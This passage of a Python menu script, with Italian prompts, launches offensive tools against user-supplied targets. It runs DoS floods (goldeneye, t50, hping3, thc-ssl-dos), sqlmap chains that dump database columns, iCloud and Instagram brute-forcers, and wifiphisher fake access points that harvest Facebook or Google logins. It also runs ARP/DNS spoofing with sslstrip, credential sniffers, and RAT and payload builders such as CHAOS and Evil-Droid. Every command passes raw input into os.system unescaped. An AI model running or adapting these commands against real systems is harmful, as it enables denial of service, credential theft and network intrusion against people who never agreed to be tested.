    elif command == 'ufonet':
        os.system("xterm -T 'UfoNet' -e 'cd tools/ufonet/ && ./ufonet --download-zombies'")
        try:
            time.sleep(.2)
        except KeyboardInterrupt:
            pass
        os.system("xterm -T 'UfoNet output' -e 'cd tools/ufonet/ && ./ufonet --gui'")
        return menu()
    elif command == 'zambie':
        os.system("cd tools/zambie/ && python zambie.py")
        logo_menu()
    elif command == 'goldeneye':
        if option:
            target = option
            if 'http://' not in option:
                if "https://" in option:
                    pass
                else:
                    target = "http://" + option
            os.system("gnome-terminal -- goldeneye %s -m random"%(target))
        else:
            print("\n-# Stress Tester")
            print("-# Uso: $ goldeneye <indirizzo>\n")
        return menu()
    elif command == 'torshammer':
        if option:
            os.system("xterm -T 'TorShammer' -e 'python tools/torshammer/torshammer.py -t %s'"%(option))
        else:
            print("\n-# Stress Tester")
            print("-# Uso: $ torshammer <indirizzo>\n")
        return menu()
    elif command == 't50':
        if option:
            os.system("gnome-terminal -- t50 %s --flood --turbo"%(option))
        else:
            print("\n-# Stress Tester")
            print("-# Uso: $ t50 <indirizzo>\n")
        return menu()
    elif command == 'thcssldos':
        if option:
            if 'www.' in option or '.' not in option or len(option) < 7:
                print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                return menu()
            port = 80
            os.system("thc-ssl-dos %s %s --accept"%(option, port))
            print("")
        else:
            print("\n-# SSL Stress Tester ")
            print("-# Uso: $ thcssldos <indirizzo IP>\n")
        return menu()
    elif command == 'sqlmap':
        modules_list = ["-g","scan","-u","inj"]
        if option:
            if option not in modules_list:
                print("-# (%s-%s) Modulo non valido"%(red,end))
                return menu()
            elif option == 'scan' or option == "-g":
                if argument:
                    os.system("sqlmap -g %s"%(argument))
                else:
                    print("-# (%s-%s) Indirizzo richiesto"%(red,end))
                return menu()
            elif option == 'inj' or option == '-u':
                if argument:
                    command = "sqlmap -u %s --dbs"%(argument)
                    if "--risk=3" in command_input:
                        command = command + " --risk 3"
                    if argument2:
                        command = "sqlmap -u %s -D %s --tables"%(argument,argument2)
                        if "--risk=3" in command_input:
                            command = command + " --risk 3"
                        if argument3:
                            command = "sqlmap -u %s -D %s -T %s --columns"%(argument,argument2,argument3)
                            if "--risk=3" in command_input:
                                command = command + " --risk 3"
                            if argument4:
                                command = "sqlmap -u %s -D %s -T %s -C %s --dump"%(argument,argument2,argument3,argument4)
                                if "--risk=3" in command_input:
                                    command = command + " --risk 3"
                    os.system(command)
                else: # if argument
                    print("-# (%s-%s) Indirizzo richiesto"%(red,end))
                return menu()
        else: # if option
            print("")
            print("-# SQLinjection Tool")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print("-# scan (-g) / inj (-u)")
            print("")
            print("-# %sModulo inj%s:"%(bright_green,end))
            print(" $ sqlmap inj <target>                                - ottieni <database>")
            print(" $ sqlmap inj <target> <database>                     - ottieni <table>")
            print(" $ sqlmap inj <target> <database> <table>             - ottieni <column(s)>")
            print(" $ sqlmap inj <target> <database> <table> <column(s)> - ottieni il contenuto di <column(s)>")
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print(" <database>, <table>, <column(s)> vanno inseriti con l'avanzare dell'attacco.\n")
            print(" Nel modulo %sinj%s, per ottenete informazioni da piÃ¹ colonne contemporaneamente inserisci"%(bright_green,end))
            print(" <column(s)> nel seguente modo:")
            print(" %s<column>,<column>,<column>,...%s"%(bright_green,end))
            print("")
            print("-# Uso: $ sqlmap <modulo> <target> [<database> <table> <column(s)>] [--risk=3]")
            print(" $ sqlmap scan <target>")
            print(" $ sqlmap inj  <target> <database> <table> <column(s)> [--risk=3]")
            print("")
            return menu()
    elif command == 'commix':
        if option:
            command = "commix -u %s --ignore-401 --random-agent --force-ssl --all "%(option)
            if argument == 'l3' and argument2 == 'shellshock' or argument == 'shellshock' and argument2 == 'l3':
                print("-# (%s-%s) 'shellshock' e 'l3' non possono essere usati in contemporanea"%(red,end))
                return menu()
            elif argument == 'l3':
                command = command + "--level=3"
            elif argument == 'shellshock':
                command = command + "--shellshock"
            os.system(command)
            return menu()
        else:
            print("\n-# SQLinjection Tool\n")
            print("-# %sOpzioni%s:"%(bright_green,end))
            print("-# l3         - Usa livello 3 per l'injection (lento)")
            print("-# shellshock - Usa metodo shellshock per l'injection")
            print("\n-# Uso: $ commix <indirizzo> [opzioni]\n")
            return menu()
    elif command == 'jsql':
        print("-# Attendi l'avvio")
        os.system("open jsql")
        return menu()
    elif command == 'nosqlmap':
        os.system("NoSQLMap")
        logo_menu()
    elif command == 'webscarab':
        print("-# Attendi l'avvio")
        os.system("open webscarab")
        return menu()
    elif command == 'sqldict':
        print("-# Attendi l'avvio")
        os.system("open sqldict")
        return menu()
    elif command == "icloudbrutter":
        if option:
            if argument:
                if os.path.exists(argument) == False:
                    print("-# (%s-%s) File non trovato"%(red,end))
                    return menu()
                print("")
                os.system("cd tools/iCloudBrutter/ && python3 icloud.py --id %s --wordlist %s"%(option, argument))
                print("")
            else:
                print("-# (%s-%s) Wordlist richiesta"%(red,end))
        else:
            print("\n-# iCloud Bruteforcer direttamente dal sito originale Apple")
            print("-# Uso: $ icloudbrutter <idapple> </full/path/to/wordlist>\n")
        return menu()
    elif command == 'cpscan':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            os.system("xterm -T 'Cpscan' -e 'cd tools/cpscan/ && python cpscan.py -t %s -v'"%(option))
        else:
            print("\n-# Cerca la pagina di login admin su un sito")
            print("-# Uso: $ cpscan <indirizzo>\n")
        return menu()
    elif command == 'breacher':
        if option:
            if '.' not in option:
                print("-# (%s-%s) Inserisci un indirizzo valido"%(red,end))
                return menu()
            os.system("cd tools/Breacher/ && python breacher.py -u %s"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca pagine di login nascoste")
            print("-# Uso: $ breacher <indirizzo>\n")
            return menu()
    elif command == 'dotdotpwn':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            print("")
            os.system("dotdotpwn -m http -h %s -O -s -X -q"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca directory nascoste e altro ancora")
            print("-# Uso: $ dotdotpwn <indirizzo>\n")
            return menu()
    elif command == 'parsero':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            os.system("parsero -u %s -o -sb"%(option))
        else:
            print("\n-# Cerca il file 'robots.txt' sul sito in questione")
            print("-# Uso: $ parsero <indirizzo>\n")
        return menu()
    elif command == 'angryfuzzer':
        if option:
            if 'http://' not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://" + option
            print("")
            os.system("cd tools/angryFuzzer/ && python angryFuzzer.py -u %s -q"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca file e directory nascoste")
            print("-# Uso: $ angryfuzzer <indirizzo>\n")
            return menu()
    elif command == 'dirb':
        if option:
            target = option
            print("-# Salvataggio della ricerca al termine in %soutput/DIRB.txt%s"%(blue,end))
            if 'http://' not in option:
                target = "http://" + option
            if 'http://' in option or 'https://' in option:
                pass
            os.system("gnome-terminal -- dirb %s -f -l -w -o output/DIRB.txt"%(target))
        else:
            print("\n-# Cerca directory nascoste")
            print("-# Uso: $ dirb <indirizzo>\n")
        return menu()
    elif command == 'dirbuster':
        print("-# Attendi l'avvio")
        os.system("open dirbuster")
        return menu()
    elif command == 'dtect':
        os.system("cd tools/D-TECT/ && python d-tect.py")
        logo_menu()
    elif command == 'sechub':
        os.system("cd tools/secHub/ && python sechub.py")
        logo_menu()
    elif command == 'arachni':
        if option:
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            os.system("arachni --output-only-positives %s"%(option))
        else:
            print("\n-# Invia e analizza risposte, cerca anche vulnerabilitÃ ")
            print("-# Uso: $ arachni <indirizzo>\n")
        return menu()
    elif command == 'wpscan':
        if option:
            print("")
            os.system("wpscan %s"%(option))
            print("\n")
            return menu()
        else:
            print("\n-# Wordpress Scanner")
            print("-# Uso: wpscan <indirizzo>\n")
            return menu()
    elif command == 'zaproxy':
        print("-# Attendi l'avvio")
        os.system("open zaproxy")
        return menu()
    elif command == 'zenmap':
        print("-# Attendi l'avvio")
        os.system("open zenmap")
        return menu()
    elif command == 'uniscan':
        if option:
            print("")
            os.system("uniscan -u %s -qwedsg"%(option))
            print("\n")
        else:
            print("\n-# Cerca qualunque cosa possa interessare come servizi web, plugin, email, vari tipi di")
            print("   vulnerabilitÃ , directory nascoste e altro ancora")
            print("-# Uso: $ uniscan <indirizzo>\n")
        return menu()
    elif command == 'droopescan':
        if option:
            print("")
            os.system("droopescan scan -u %s"%(option))
            print("")
        else:
            print("\n-# Cerca temi, plugin, versioni e altro")
            print("-# Uso: $ droopescan <indirizzo>\n")
        return menu()
    elif command == 'bingoo':
        os.system("cd tools/BinGoo/ && ./bingoo")
        logo_menu()
    elif command == 'knockmail':
        os.system("cd tools/KnockMail/ && python knock.py")
        logo_menu()
    elif command == 'xsssniper':
        if option:
            os.system("cd tools/xsssniper/ && python xsssniper.py -u %s --crawl"%(option))
            print("")
        else:
            print("\n-# Cerca la vulnerabilitÃ  in XSS")
            print("-# Uso: xsssniper <indirizzo>\n")
        return menu()
    elif command == 'hping3':
        if option:
            print("")
            os.system("hping3 --flood %s"%(argument))
            print("")
        else:
            print("\n-# Stress Tester ")
            print("-# Uso: $ hping3 <indirizzo>\n")
        return menu()
    elif command == 'sslyze':
        if option:
            os.system("python3 /usr/local/bin/sslyze --regular %s"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca vulnerabilitÃ  in OpenSSL e TLS")
            print("-# Uso: $ sslyze <indirizzo>\n")
            return menu()
    elif command == 'nikto':
        if option:
            print("")
            os.system("nikto -host %s"%(option))
            print("\n")
            return menu()
        else:
            print("\n-# Cerca versioni, vulnerabilitÃ  in XSS, ClickJacking e altro")
            print("-# Uso: $ nikto <indirizzo>\n")
            return menu()
    elif command == 'cutycapt':
        if option:
            target = option
            if 'http://' not in option:
                target = "http://" + option
            elif 'http://' in option or 'https://' in option:
                pass
            print("-# Attendi il termine del processo se eseguito correttamente")
            os.system("gnome-terminal -- cutycapt --url==%s --out==output/cutycapt_screenshot.png"%(target))
            print("-# Lo screenshot verrÃ  salvato in %soutput/cutycapt_screenshot.png%s"%(blue,end))
        else:
            print("\n-# Fai uno screenshot al sito in questione")
            print("-# Uso: $ cutycapt <indirizzo>\n")
        return menu()
    elif command == 'fimap':
        if option:
            target = option
            print("")
            if 'http://' not in option:
                target = "http://" + option
            if 'http://' in option or 'https://' in option:
                pass
            os.system("fimap -u %s -4 -C -D --force-run"%(target))
            print("")
        else:
            print("\n-# LFI/RFI Scanner e Exploiter")
            print("-# Uso: $ fimap <indirizzo>\n")
        return menu()
    elif command == 'vega':
        print("-# Attendi l'avvio")
        os.system("open vega")
        return menu()
    elif command == 'infoga':
        if option:
            print("")
            os.system("cd tools/Infoga/ && python3 infoga.py -d %s -s all -b -v 3"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca indirizzi email tramite indirizzo")
            print("-# Uso: $ infoga <indirizzo>\n")
            return menu()
    elif command == "wafw00f":
        if option:
            os.system("wafw00f --findall --verbose %s"%(option))
            print("")
        else:
            print("\n-# Cerca Firewall su un sito")
            print("-# Uso: $ wafw00f <indirizzo>\n")
        return menu()
    elif command == "skipfish":
        if option:
            os.system("xterm -e 'rm -rf output/Skipfish'")
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            os.system("skipfish -U -o %s/output/Skipfish %s"%(os.getcwd(),option))
            try:
                f = open("%s/output/Skipfish/index.html"%(os.getcwd()))
                f.close()
                print("\n-# Apro la pagina di analisi, solo un momento...\n")
                os.system("open firefox %s/output/Skipfish/index.html"%(os.getcwd()))
            except IOError:
                print("-# (%s-%s) Errore nell'apertura del file, questo non dovrebbe succedere..."%(red,end))
        else:
            print("\n-# All-in-one Web Application Scanner")
            print("-# Uso: $ skipfish <indirizzo>\n")
        return menu()
    elif command == "devploit":
        os.system("Devploit")
        logo_menu()
    elif command == "sfinder":
        if option:
            def unique(seq):
            	chf = set()
            	return [chf.add(Y) or Y for Y in seq if Y not in chf]
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            pg = 1
            wbs = []
            while pg <= 101:
                try:
                    bng = "http://www.bing.com/search?q=ip%3A" + option + "+&count=50&first=" + str(pg)
                    obng = urllib2.urlopen(bng)
                    rbng = obng.read()
                    fwbs = re.findall('<h2><a href="(.*?)"', rbng)
                    for i in range(len(fwbs)):
                        alcls = fwbs[i]
                        findal = re.findall('http://(.*?)/', alcls)
                        for xdd, itt in enumerate(findal):
                            if 'www' not in itt:
                                findal[xdd] = 'http://www.' + itt + '/'
                            else:
                                findal[xdd] = 'http://' + itt + '/'
                        wbs.extend(findal)
                    pg += 50
                except urllib2.URLError:
                    print("-# (%s-%s) Nessuna connessione"%(red,end))
                    return menu()
            wbss = unique(wbs)
            if len(wbss) == 0:
                print("-# (%s-%s) Nessun Risultato"%(red,end))
                return menu()
            print("\n-# %sRisultati%s:"%(bright_green+underline,end))
            for site in wbss:
                print("-# %s"%site)
            print("")
        else:
            print("\n-# Cerca tutti i siti host su un server da un indirizzo")
            print("-# Uso: $ sfinder <indirizzo>\n")
        return menu()
    elif command == "witchxtool":
        os.system("cd tools/witchxtool/ver1.1/ && perl witchxtool.pl")
        logo_menu()
    elif command == "fuckscrap":
        print("")
        os.system("cd tools/FuckScrap/ && python3 FuckScrap.py")
        print("")
        return menu()
    elif command == "btscanner":
        print("")
        os.system("btscanner")
        if os.path.isfile("btscanner.log"):
            os.system("mv btscanner.log output/")
        print("")
        return menu()
    elif command == 'sublist3r':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            if "www." in option:
                option = option.replace("www.","")
            os.system("sublist3r -d %s -p 21,22,80,443,445 -v"%(option))
            print("")
        else:
            print("\n-# Cerca tramite indirizzo tutti i sottodomini inerenti")
            print("-# Uso: $ sublist3r <indirizzo>\n")
        return menu()
    elif command == 'dnsenum':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            print("")
            os.system("dnsenum -u a -v %s"%(option))
            print("")
        else:
            print("\n-# Mostra informazioni DNS di un indirizzo")
            print("-# Uso: $ dnsenum <indirizzo>\n")
        return menu()
    elif command == 'dnsmap':
        if option:
            target = option
            if "http://" in option:
                target = option.replace("http://","")
            if "https://" in option:
                target = option.replace("https://","")
            if "www." in option or "www." in target:
                target = option.replace("www.","")
            print("")
            os.system("dnsmap %s"%(target))
            print("")
            return menu()
        else:
            print("\n-# Mappatore di rete")
            print("-# Uso: $ dnsmap <indirizzo>\n")
            return menu()
    elif command == 'smtpuserenum':
        if option:
            if '.txt' in option or '.lst' in option:
                if argument:
                    if os.path.exists(option) == False:
                        print("-# (%s-%s) File non trovato"%(red,end))
                        return menu()
                    print("")
                    os.system("smtp-user-enum -M VRFY -U %s -t %s"%(option, argument))
                    print("")
                else:
                    print("-# (%s-%s) Indirizzo richiesto"%(red,end))
                return menu()
            if argument:
                if "http://" in argument:
                    argument = argument.replace("http://","")
                if "https://" in argument:
                    argument = argument.replace("https://","")
                os.system("smtp-user-enum -M VRFY -u %s -t %s"%(option, argument))
                print("")
            else:
                print("-# (%s-%s) Indirizzo richiesto"%(red,end))
        else:
            print("\n-# Verifica se un utente / lista di utenti esiste sul protocollo SMTP")
            print("-# Uso: $ smtpuserenum <user/user_list.txt> <indirizzo>\n")
        return menu()
    elif command == 'sshscan':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            os.system("python tools/SSHScan/sshscan.py -t %s"%(option))
            print("")
        else:
            print("\n-# Mostra le varie cifrature del modulo ssh di un indirizzo")
            print("-# Uso: $ sshscan <indirizzo>\n")
        return menu()
    elif command == 'pentmenu':
        os.system("./tools/pentmenu/pentmenu")
        logo_menu()
    elif command == 'a2sv':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            print("")
            os.system("cd tools/a2sv/ && python a2sv.py -t %s -p %s"%(option, port))
            print("")
        else:
            print("\n-# SSL Scanner, consiglia gli exploit da utilizzare")
            print("-# Uso: a2sv <indirizzo>\n")
        return menu()
    elif command == 'recon-ng':
        os.system("recon-ng")
        logo_menu()
    elif command == 'sslscan':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            print("")
            os.system("sslscan --tlsall --bugs --verbose %s:%s"%(option, port))
            print("")
        else:
            print("\n-# Testa il servizio SSL alla ricerca di vulnerabilitÃ ")
            print("-# Uso: $ sslscan <indirizzo>\n")
        return menu()
    elif command == 'xsstracer':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            os.system("cd tools/XSSTracer/ && python xsstracer.py %s %s"%(option, port))
        else:
            print("\n-# Cerca la vulnerabilitÃ  XSS")
            print("-# Uso: $ xsstracer <indirizzo>\n")
        return menu()
    elif command == 'crips':
        os.system("crips")
        logo_menu()
    elif command == 'vbscan':
        if option:
            target = option
            if 'http://' not in option:
                target = "http://" + option
            elif 'http://' in option or 'https://' in option:
                pass
            os.system("cd tools/vbscan/ && perl vbscan.pl %s"%(target))
            print("")
        else:
            print("\n-# Cerca vulnerabilitÃ  da sfruttare come Vbulletin, XSS, SQLi, ecc...")
            print("-# Uso: $ vbscan <indirizzo>\n")
        return menu()
    elif command == 'whatweb':
        if option:
            print("-# Solo in momento...\n")
            os.system("whatweb -v -a 3 %s"%(option))
        else:
            print("\n-# Cerca informazioni inerenti al sito (versioni,...)")
            print("-# Uso: $ whatweb <indirizzo>\n")
        return menu()
    elif command == 'siege':
        if option:
            print("")
            os.system("siege -g %s"%(option))
        else:
            print("\n-# Stress Tester")
            print("-# Uso: $ siege <indirizzo>\n")
        return menu()
    elif command == 'urlextractor':
        if option:
            os.system("cd tools/URLextractor/ && ./extractor.sh %s"%(option))
            print("")
        else:
            print("\n-# Estrai tutti gli indirizzi da un sito")
            print("-# Uso: $ urlextractor <indirizzo>\n")
        return menu()
    elif command == 'instarecon':
        if option:
            target = option
            if "http://" in option:
                target = option.replace("http://","")
            if "https://" in option:
                target = option.replace("https://","")
            if "www." in option or "www." in target:
                target = option.replace("www.","")
            print("")
            os.system("instarecon.py %s"%(target))
            print("")
        else:
            print("\n-# Cerca l'hostname da un indirizzo con alcune funzioni in piÃ¹")
            print("-# Uso: $ instarecon <indirizzo>\n")
        return menu()
    elif command == 'dsxs':
        if option:
            print("")
            os.system("cd tools/DSXS/ && python dsxs.py -u %s"%(option))
            print("")
        else:
            print("\n-# Cerca vulnerabilitÃ  in XSS")
            print("-# Uso: $ dsxs <indirizzo>\n")
        return menu()
    elif command == 'joomscan':
        if option:
            os.system("joomscan -u %s -ec -r"%(option))
            print("")
            return menu()
        else:
            print("\n-# Cerca vulnerabilitÃ  sul servizio Joomla")
            print("-# Uso: $ joomscan <target>\n")
            return menu()
    elif command == 'amap':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            port = 80
            if "https://" in option:
                port = 443
            print("")
            os.system("amap %s %s -A -bvq -1"%(option, port))
            print("")
            return menu()
        else:
            print("\n-# Identificatore, puÃ² trovare processi su una porta diversa da quella di default, ecc...")
            print("-# Uso: $ amap <indirizzo>\n")
            return menu()
    elif command == 'automater':
        if option:
            print("-# Solo un momento...")
            os.system("automater %s -v"%(option))
            print("")
            return menu()
        else:
            print("\n-# Tool passivo per analisit IP, url e hash")
            print("-# Uso: $ automater <indirizzo>\n")
            return menu()
    elif command == 'ip2host':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.replace("http://","")
                    if "https://" in option:
                        option = option.replace("https://","")
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            try:
                socket.inet_aton(option)
            except (socket.error, UnboundLocalError):
                print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                return menu()
            hostname = socket.getfqdn(option)
            if hostname == option:
                print("-# Nessun Hostname assegnato per: %s"%(bright_green+hostname+end))
                return menu()
            print("-# Hostname: "+bright_green+hostname+end)
            return menu()
        else:
            print("\n-# Ottieni l'hostname da un indirizzo IP")
            print("-# Uso: $ ip2host <indirizzo IP>\n")
            return menu()
    elif command == "owscan":
        os.system("cd tools/OWScan/ && php owscan.php")
        print("\n")
        return menu()
    elif command == "xsstrike":
        print("")
        os.system("cd tools/XSStrike/ && ./xsstrike")
        print("")
        return menu()
    elif command == 'xhydra':
        print("-# Attendi l'avvio")
        os.system("open xhydra")
        os.system("xterm -e 'rm hydra.restore'")
        return menu()
    elif command == 'xattacker':
        os.system("reset")
        os.system("cd tools/XAttacker/ && perl XAttacker.pl")
        logo_menu()
    elif command == 'blazy':
        os.system("cd tools/Blazy && python blazy.py")
        print("")
        return menu()
    elif command == 'brutesploit':
        os.system("cd tools/BruteSploit/ && ./Brutesploit")
        logo_menu()
    elif command == 'instaburst':
        os.system("cd tools/InstaBurst/ && python instagram.py")
        logo_menu()
    elif command == "blackhydra":
        os.system("cd tools/Black-Hydra/ && python blackhydra.py")
        logo_menu()
    elif command == "drup":
        if option:
            os.system("cd tools/Drup/ && python drup.py %s"%(option))
            print("")
        else:
            print("\n-# Cerca la password d'accesso di default di router, modem e telecamere")
            print("-# Uso: $ drup <acer/cisco/d-link/asus/...>\n")
        return menu()
    elif command == "cr3dov3r":
        if option:
            if "@" not in option or "." not in option:
                print("-# (%s-%s) Indirizzo email non valido"%(red,end))
                return menu()
            os.system("cd tools/Cr3dOv3r/ && python3 Cr3d0v3r.py -api2 %s"%(option))
            print("")
        else:
            print("\n-# Cerca informazioni da un indirizzo email e tenta l'autenticazione su alcuni siti")
            print("-# Uso: $ cr3dov3r <email>\n")
        return menu()
    elif command == 'airgeddon':
        os.system("reset")
        os.system("cd tools/airgeddon/ && ./airgeddon.sh")
        logo_menu()
    elif command == 'fluxion':
        os.system("reset")
        os.system("cd tools/fluxion/ && ./fluxion.sh")
        logo_menu()
    elif command == 'fakeauth':
        os.system("cd tools/FakeAuth/FakeAuth/ && python fakeauth.py")
        logo_menu()
    elif command == 'wifiphisher':
        if option:
            essid = option
            if argument:
                templates = ["facebook","google","gopro","starbucks","yahoo"]
                template = argument
                if template not in templates:
                    print("-# (%s-%s) Template non valido"%(red,end))
                    return menu()
                if template == "facebook": template = "facebook-login"
                if template == "google": template = "google-login"
                if template == "gopro": template = "gopro-login"
                if template == "starbucks": template = "starbucks-login"
                if template == "yahoo": template = "yahoo-login"
                os.system("wifiphisher -nJ -e %s -T %s"%(essid,template))
            else:
                print("-# (%s-%s) Template richiesto"%(red,end))
        else:
            print("\n-# Crea un Fake Access Point con l'impaginazione di login identica a yahoo, google,...")
            print("   e cattura le credenziali di autenticazione\n")
            print("-# %sTemplates%s:"%(bright_green,end))
            print("-# facebook / google / gopro / starbucks / yahoo")
            print("\n-# Uso: $ wifiphisher <fake-AP name> <template>\n")
        return menu()
    elif command == 'wifite':
        os.system("gnome-terminal -- wifite")
        return menu()
    elif command == 'wpsbreaker':
        os.system("cd tools/HT-WPS-Breaker/ && ./HT-WB.sh")
        logo_menu()
    elif command == 'netattack':
        os.system("reset")
        os.system("cd tools/netattack2/ && python netattack2.py")
        logo_menu()
    elif command == 'wifijammer':
        os.system("gnome-terminal -- python tools/wifijammer/wifijammer.py")
        return menu()
    elif command == 'routersploit':
        os.system("routersploit")
        os.system("xterm -T 'output' -e 'rm routersploit.log'")
        logo_menu()
    elif command == 'wirespy':
        os.system("reset")
        os.system("cd tools/wirespy/ && ./wirespy.sh")
        logo_menu()
    elif command == 'bettercap':
        print("-# La sessione di sniffing verrÃ  salvata in %soutput/bettercap.txt%s"%(blue,end))
        os.system("gnome-terminal -- bettercap -autostart \"arp.spoof,dhcp6.spoof,dns.spoof,http.proxy,https.proxy,net.probe,net.recon,net.sniff,events.stream\" -eval \"set net.sniff.verbose true; set dns.spoof.all true; set http.proxy.sslstrip true; set https.proxy.sslstrip true; set net.sniff.local true; set net.sniff.output output/bettercap.txt\"")
        return menu()
    elif command == 'morpheus':
        os.system("reset")
        os.system("cd tools/morpheus/ && ./morpheus.sh")
        logo_menu()
    elif command == 'wireshark':
        print("-# Attendi l'avvio")
        os.system("open wireshark")
        return menu()
    elif command == 'ettercap':
        os.system("gnome-terminal -- ettercap -G")
        return menu()
    elif command == 'mitmf':
        try:
            os.system("mitmf -i %s --spoof --arp --dns --hsts --gateway %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1], str(get_gateway())))
            print("")
        except KeyError:
            print("-# (%s-%s) Nessuna connessione"%(red,end))
        return menu()
    elif command == 'mitmap':
        os.system("cd tools/mitmAP/ && python3 mitmAP.py")
        print("\n-# Attendi per la riconnessione alla rete.\n")
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            pass
        logo_menu()
    elif command == 'cdpsnarf':
        print("\n-# Il pacchetto CDP Ã¨ usato da sistemi cisco per comunicare tra loro e coi dispositivi")
        print("   connessi. Esso puÃ² contenere informazioni sensibili sui dispositivi.")
        print("-# L'output verrÃ  salvato in %soutput/CDPSnarf.pcap%s\n"%(blue,end))
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print("")
            return menu()
        try:
            os.system("cdpsnarf -i %s -w output/CDPSnarf.pcap"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
            print("")
        except KeyError:
            print("-# (%s-%s) Nessuna connessione"%(red,end))
        return menu()
    elif command == 'cookie-cadger':
        print("-# Attendi l'avvio")
        os.system("open cookie-cadger")
        return menu()
    elif command == 'ciscotorch':
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            print("")
            os.system("cisco-torch %s %s"%(module, argument))
            print("")
        else:
            print("\n-# Scanner, exploiter e altro ancora per reti cisco")
            print("-# Uso: $ ciscotorch <indirizzo> <modulo>\n")
        return menu()
    elif command == 'p0f':
        os.system("p0f -p -o output/p0f.txt")
        print("\n-# Output salvato in %soutput/p0f.txt%s\n"%(blue,end))
        return menu()
    elif command == 'snmpcheck':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.replace("http://","")
                    if "https://" in option:
                        option = option.replace("https://","")
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            os.system("snmp-check %s"%(option))
            print("")
        else:
            print("\n-# Mostra varie informazioni come connessioni (TCP), porte (UDP) e altro ancora")
            print("-# L'indirizzo IP deve avere la porta 161 aperta")
            print("-# Uso: $ snmpcheck <indirizzo IP>\n")
        return menu()
    elif command == 'sslstrip':
        print("\n-# Salvataggio risultati al termine in %soutput/sslstrip.txt%s\n"%(blue,end))
        os.system("sslstrip --all -w output/sslstrip.txt -l 8080")
        print("\n")
        return menu()
    elif command == 'bluelog':
        print("")
        os.system("bluelog -n -m -c -f -t -e -i hci0 -o output/bluelog.log -v")
        print("")
        return menu()
    elif command == 'dhcpig':
        print("")
        try:
            os.system("cd tools/DHCPig/ && python pig.py -a -i -l -g -r -n -c %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
            print("")
        except KeyError:
            print("-# (%s-%s) Nessuna connessione"%(red,end))
        return menu()
    elif command == "voiphopper":
        if option:
            print("")
            os.system("voiphopper -i %s -c 0"%(option))
            print("")
        else:
            print("\n-# Cattura pacchetti CDP")
            print("-# Uso: $ voiphopper <interface>\n")
        return menu()
    elif command == "driftnet":
        print("")
        os.system("driftnet -s -v")
        print("\n",end)
        return menu()
    elif command == "pcredz":
        if option:
            if option != "auto":
                try:
                    f = open(option)
                    f.close()
                    command = "cd tools/PCredz/ && ./Pcredz -f %s"%(option)
                except IOError:
                    print("-# (%s-%s) File non trovato"%(red,end))
                    return menu()
            else:
                try:
                    command = "cd tools/PCredz/ && ./Pcredz -i %s -t"%(netifaces.gateways()['default'][netifaces.AF_INET][1])
                except KeyError:
                    print("-# (%s-%s) Nessuna connessione"%(red,end))
                    return menu()
            print("")
            os.system(command)
            print("")
        else:
            print("\n-# Estrai informazioni come codici IBAN, autenticazioni http, ecc...")
            print("-# Uso: $ pcredz auto [/full/path/to/file.pcap]\n")
        return menu()
    elif command == 'chaos':
        os.system("reset")
        os.system("cd tools/CHAOS/ && go run CHAOS.go")
        logo_menu()
    elif command == 'overthruster':
        os.system("cd tools/OverThruster/ && python OverThruster.py")
        logo_menu()
    elif command == 'arcanus':
        os.system("reset")
        os.system("cd tools/ARCANUS/ && ./ARCANUS")
        logo_menu()
    elif command == 'evildroid':
        os.system("reset")
        os.system("cd tools/Evil-Droid/ && ./evil-droid")
        logo_menu()
    elif command == 'ezsploit':
        os.system("reset")
        os.system("cd tools/ezsploit/ && ./ezsploit.sh")
        logo_menu()
    elif command == 'zirikatu':
        os.system("reset")
        os.system("cd tools/zirikatu/ && ./zirikatu.sh")
        logo_menu()
    elif command == 'kautilya':
